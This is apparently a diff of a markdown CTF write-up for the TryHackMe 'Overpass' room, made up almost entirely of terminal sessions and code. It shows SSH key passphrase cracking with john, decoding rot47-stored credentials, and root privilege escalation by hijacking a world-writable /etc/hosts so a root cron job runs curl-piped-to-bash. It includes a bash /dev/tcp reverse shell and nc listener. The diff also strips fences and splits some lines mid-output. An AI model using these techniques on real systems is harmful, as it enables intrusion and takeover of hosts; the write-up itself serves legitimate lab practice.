@@ -28,11 +28,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2022/01/29 07:24:56 Finished
 ===============================================================
-```
-
-
-
-```
 async function postData(url = '', data = {}) {
  // Default options are marked with *
  const response = await fetch(url, {
@@ -76,11 +71,6 @@ async function login() {
  window.location = "/admin"
  }
 }
-```
-
-
-
-```
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
@@ -101,59 +91,42 @@ eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
 GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
 ...(omit)...
 -----END RSA PRIVATE KEY-----
-```
-
-
-
-```
 ┌──(kali㉿kali)-[~/ctf]
 └─$ wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
 --2022-01-29 05:52:16-- https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:
+443... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 8537 (8.3K) [text/plain]
 Saving to: ‘ssh2john.py’
 
-ssh2john.py 100%[================================================================>] 8.34K --.-KB/s in 0.004s 
+ssh2john.py 100%[================================================================>] 8.34K --.-KB/s in 0.004s
 
 2022-01-29 05:52:16 (2.25 MB/s) - ‘ssh2john.py’ saved [8537/8537]
-```
-
-
-
-```
 ┌──(kali㉿kali)-[~/ctf]
 └─$ python3 ssh2john.py id_rsa > rsa.hash
-```
-
-
-
-```
 ┌──(kali㉿kali)-[~/ctf]
-└─$ john rsa.hash 
+└─$ john rsa.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
 Cost 2 (iteration count) is 1 for all loaded hashes
 Will run 2 OpenMP threads
-Proceeding with single, rules:Single
+Proceeding with single, rules:
+Single
 Press 'q' or Ctrl-C to abort, almost any other key for status
 Almost done: Processing the remaining buffered candidate passwords, if any.
 Proceeding with wordlist:/usr/share/john/password.lst
-Proceeding with incremental:ASCII
-james13 (key.private) 
+Proceeding with incremental:
+ASCII
+james13 (key.private)
 1g 0:00:00:03 DONE 3/3 (2022-01-29 06:21) 0.2777g/s 393498p/s 393498c/s 393498C/s jamest1..jamesey
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
-
-
-
-```
 $ chmod 400 id_rsa
 $ ssh -i id_rsa james@10.10.17.22
-Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa':
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
 
  * Documentation: https://help.ubuntu.com
@@ -174,12 +147,7 @@ Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
 james@overpass-prod:~$ ls
 todo.txt user.txt
 james@overpass-prod:~$ cat user.txt
-```
-
-
-
-```
-james@overpass-prod:~$ cat todo.txt 
+james@overpass-prod:~$ cat todo.txt
 To Do:
 > Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
 > Write down my password somewhere on a sticky note so that I don't forget it.
@@ -187,31 +155,12 @@ To Do:
 > Test Overpass for macOS, it builds fine but I'm not sure it actually works
 > Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
-```
-
-
-
-```
-james@overpass-prod:~$ cat .overpass 
-,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
-```
-
-
-
-```
+james@overpass-prod:~$ cat .overpass
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:
+4EFC6QN.
 //Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
 func rot47(input string) string {
-```
-
-
-
-```
 [{"name":"System","pass":"saydrawnlyingpicture"}]
-```
-
-
-
-```
 james@overpass-prod:~$ overpass
 Welcome to Overpass
 Options:
@@ -222,22 +171,12 @@ Options:
 5 Exit
 Choose an option: 4
 System saydrawnlyingpicture
-```
-
-
-
-```
 GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
 ## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
 ## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
 ## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
 ## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
 echo "$(date -R) Builds completed" >> /root/buildStatus
-```
-
-
-
-```
 james@overpass-prod:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -255,11 +194,6 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 # Update builds from latest code
 * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
-```
-
-
-
-```
 james@overpass-prod:~$ nslookup
 > overpass.thm
 Server: 127.0.0.53
@@ -268,11 +202,6 @@ Address: 127.0.0.53#53
 Non-authoritative answer:
 Name: overpass.thm
 Address: 127.0.0.1
-```
-
-
-
-```
 james@overpass-prod:~$ cat /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
@@ -285,50 +214,15 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 james@overpass-prod:~$ ls -l /etc/hosts
 -rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts
-```
-
-
-
-```
 <AttackBoxのIP> overpass.thm
-```
-
-
-
-```
 $ mkdir -p downloads/src
 $ vi downloads/src/buildscript.sh
-```
-
-
-
-```
 bash -i >& /dev/tcp/<AttackBoxのIP>/8000 0>&1
-```
-
-
-
-```
 $ python3 -m http.server 80
 ...(omit)...
 http server OSError: [Errno 98] Address already in use
-```
-
-
-
-```
 $ ps -fA | grep python
-```
-
-
-
-```
 $ kill xxxx
-```
-
-
-
-```
 $ ssh root@10.10.94.66
 ...(omit)...
 Last login: Sun Jan 30 19:35:55 on ttys002
@@ -338,58 +232,29 @@ To update your account to use zsh, please run `chsh -s /bin/zsh`.
 For more details, please visit https://support.apple.com/kb/HT208050.
 $ ssh root@10.10.94.66
 The authenticity of host '10.10.94.66 (10.10.94.66)' can't be established.
-ECDSA key fingerprint is SHA256:canwcHIDVP3XvmtAH4/zdRgsCTrwKDt+Lv+YDuMi64E.
+ECDSA key fingerprint is SHA256:
+canwcHIDVP3XvmtAH4/zdRgsCTrwKDt+Lv+YDuMi64E.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.94.66' (ECDSA) to the list of known hosts.
-root@10.10.94.66's password: 
+root@10.10.94.66's password:
 
- _____ _ _ _ __ __ 
-|_ _| __ _ _| | | | __ _ ___| | _| \/ | ___ 
+ _____ _ _ _ __ __
+|_ _| __ _ _| | | | __ _ ___| | _| \/ | ___
  | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
  | || | | |_| | _ | (_| | (__| <| | | | __/
  |_||_| \__, |_| |_|\__,_|\___|_|\_\_| |_|\___|
  |___/
-```
-
-
-
-```
-root@ip-10-10-94-66:~# cat downloads/src/buildscript.sh 
+root@ip-10-10-94-66:~# cat downloads/src/buildscript.sh
 bash -i >& /dev/tcp/10.10.94.66/8000 0>&1
-```
-
-
-
-```
 root@ip-10-10-94-66:~# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-
-
-
-```
 root@ip-10-10-94-66:~# nc -lvnp 8000
 Listening on [0.0.0.0] (family 0, port 8000)
-```
-
-
-
-```
 10.10.104.176 - - [31/Jan/2022 06:33:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
-```
-
-
-
-```
 Connection from 10.10.104.176 33150 received!
 bash: cannot set terminal process group (17918): Inappropriate ioctl for device
 bash: no job control in this shell
 root@verpass-prod:~#
-```
-
-
-
-```
 root@overpass-prod:~# ls
 ls
 buildStatus
@@ -399,14 +264,10 @@ root.txt
 src
 root@overpass-prod:~# cat root.txt
 cat root.txt
-```
-
-
-
-```
 root@overpass-prod:~# cd /home/tryhackme
 cd /home/tryhackme
-root@overpass-prod:/home/tryhackme# ls -a
+root@overpass-prod:/home/tryhackme
+# ls -a
 ls -a
 .
 ..
@@ -421,12 +282,8 @@ ls -a
 go
 resources
 server
-root@overpass-prod:/home/tryhackme# cat .overpass 
+root@overpass-prod:/home/tryhackme
+# cat .overpass
 ,LQ?2>6QiQ%CJw24<|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8>%sJ=QN.
-```
-
-
-
-```
 [{"name":"TryHackMe Subscription Code","pass":"gmTDyl"}]
 ```
